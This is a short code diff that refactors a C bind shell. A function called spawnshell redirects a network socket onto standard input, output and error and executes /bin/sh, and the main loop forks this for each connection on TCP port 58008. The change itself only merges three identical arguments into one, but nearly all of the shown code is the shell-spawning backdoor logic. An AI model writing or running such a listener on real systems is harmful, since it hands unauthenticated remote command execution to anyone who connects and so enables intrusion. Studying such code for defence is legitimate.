@@ -6,12 +6,12 @@
 
 #define TCP_PORT 58008
 
-void spawnshell(int in, int out, int err)
+void spawnshell(int socket_fd)
 {
-    dup2(in, 0);
-    dup2(out, 1);
-    dup2(err, 2);
-    execve("/bin/sh", (char*[]){NULL}, (char*[]){NULL});
+    dup2(socket_fd, 0);
+    dup2(socket_fd, 1);
+    dup2(socket_fd, 2);
+    execve("/bin/sh", (char *[]){NULL}, (char *[]){NULL});
 }
 
 int main(int argc, char *argv[])
@@ -49,7 +49,7 @@ int main(int argc, char *argv[])
         if (fork() == 0)
         {
             close(sock);
-            spawnshell(socket_fd, socket_fd, socket_fd);
+            spawnshell(socket_fd);
             exit(0);
         }
         else
